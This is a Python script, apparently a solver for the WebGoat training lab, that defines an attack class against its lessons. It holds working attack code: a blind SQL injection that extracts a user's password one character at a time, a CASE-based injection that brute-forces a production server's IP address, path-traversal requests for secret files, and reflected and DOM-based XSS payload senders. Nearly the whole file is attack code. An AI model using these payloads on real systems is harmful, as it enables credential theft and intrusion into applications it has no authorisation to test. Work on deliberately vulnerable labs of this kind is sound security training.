# Import the necessary packages
import sys
import json
import requests
import urllib
import urllib3
from requests_toolbelt.multipart.encoder import MultipartEncoder


class SQLInjection:
    """Class for performing SQL injection attacks"""

    def __init__(self, url, cookie):
        """Initialize with the target URL and session cookie"""
        self.url = url
        self.cookie = cookie

    def sql_injection_advance_5(self, username, lesson):
        """Perform advanced SQL injection"""

        alphabet_index = 0
        alphabet = 'abcdefghijklmnopqrstuvwxyz'
        password_index = 0
        password = ''

        # Set up headers with the session cookie
        headers = {'Cookie': 'JSESSIONID=' + self.cookie}

        while True:
            # Prepare the SQL payload
            payload = f"{username}' AND substring(password,{password_index + 1},1)='{alphabet[alphabet_index]}"

            data = {
                'username_reg': payload,
                'email_reg': f'{username}@{username}.com',
                'password_reg': 'test123',
                'confirm_password_reg': 'test123'
            }

            # Send the PUT request
            r = requests.put(self.url + lesson, headers=headers, data=data)

            try:
                response = json.loads(r.text)
            except:
                print(
                    "Wrong JSESSIONID, find it by looking at your requests once logged in.")
                return

            # Check if the username already exists
            if "already exists please try to register with a different username" not in response['feedback']:
                alphabet_index += 1
                if alphabet_index > len(alphabet) - 1:
                    return password
            else:
                password += alphabet[alphabet_index]
                alphabet_index = 0
                password_index += 1

    def sql_injection_mitigation_10(self, lesson, prod_server_name, ip_last_octects):
        """Perform SQL injection mitigation"""

        index = 0

        # Set up headers with the session cookie
        headers = {'Cookie': 'JSESSIONID=' + self.cookie}

        while True:
            # Prepare the SQL payload
            payload = f"(CASE WHEN (SELECT ip FROM servers WHERE hostname='{prod_server_name}') LIKE '{index}.%' THEN id ELSE hostname END)"
            r = requests.get(self.url + lesson + payload, headers=headers)

            try:
                response = json.loads(r.text)
            except:
                print(
                    "Wrong JSESSIONID, find it by looking at your requests once logged in.")
                return

            if response[0]['id'] == '1':
                prod_server_ip = f"{index}.{ip_last_octects}"
                print(f"{prod_server_name} IP: {prod_server_ip}")
                return prod_server_ip
            else:
                index += 1
                if index > 255:
                    print("No IP found")
                    return

    def path_traversal_random_picture(self, lesson, payload, secret_file):
        """Fetch a picture using path traversal"""

        # Define headers for the HTTP request
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0",
            "Content-Type": "application/x-www-form-urlencoded",
            "Charset": "UTF-8",
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.5",
            "X-Requested-With": "XMLHttpRequest",
            "Connection": "keep-alive",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "Content-Length": "0",
            "Cookie": 'JSESSIONID=' + self.cookie
        }

        try:
            # Create a connection pool manager
            http = urllib3.PoolManager()
            # Send the GET request and retrieve the response
            response = http.request(
                'GET', self.url + lesson + payload + secret_file, headers=headers)
            # Process the response body
            result = response.data.decode('utf-8').split(',')

            return result

        except requests.exceptions.HTTPError as err:
            print(err.request.url)
            print(err)
            print(err.response.text)

    def reflected_xss(self, lesson, payload):
        """Fetch data using reflected XSS"""

        # Define headers for the HTTP request
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Charset": "UTF-8",
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.5",
            "X-Requested-With": "XMLHttpRequest",
            "Connection": "keep-alive",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "Content-Length": "0",
            "X-XSS-Protection": "0",
            "Cookie": 'JSESSIONID=' + self.cookie
        }

        try:
            # Create a connection pool manager
            http = urllib3.PoolManager()
            # Send the GET request and retrieve the response
            response = http.request(
                'GET', self.url + lesson + payload, headers=headers)
            # Process the response body
            result = response.data.decode('utf-8').split(',')

            return result

        except requests.exceptions.HTTPError as err:
            print(err.request.url)
            print(err)
            print(err.response.text)

    def dom_based_xss(self, lesson, payloads):
        """Attempt a DOM-based XSS attack using a list of payloads"""

        # Define headers for the HTTP request
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0",
            "Content-Type": "application/x-www-form-urlencoded",
            "Charset": "UTF-8",
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.5",
            "X-Requested-With": "XMLHttpRequest",
            "Connection": "keep-alive",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "Content-Length": "0",
            "Cookie": 'JSESSIONID=' + self.cookie
        }

        try:
            vulnerable = False
            for payload in payloads:
                # Ensure safe characters in payload
                safe_payload = urllib.parse.quote(payload, safe="()<>'';")

                # Form the request url
                request_url = self.url + lesson + safe_payload

                # Send the GET request
                response = requests.get(request_url, headers=headers)

                print(f"URL: {request_url}")
                print("raw: ", response.raw._original_response.__dict__)
                print("headers: ", response.raw._original_response.headers.__dict__)
                print("message: ", response.raw._original_response.msg.__dict__)

                # Check if the payload is present in the response
                if safe_payload in response.text:
                    vulnerable = True
                    print(
                        f"Possible DOM-based XSS vulnerability found with payload: {safe_payload}")

            if not vulnerable:
                print("No DOM-based XSS vulnerability found using provided payloads.")
        except requests.exceptions.HTTPError as err:
            print(err.request.url)
            print(err)
            print(err.response.text)
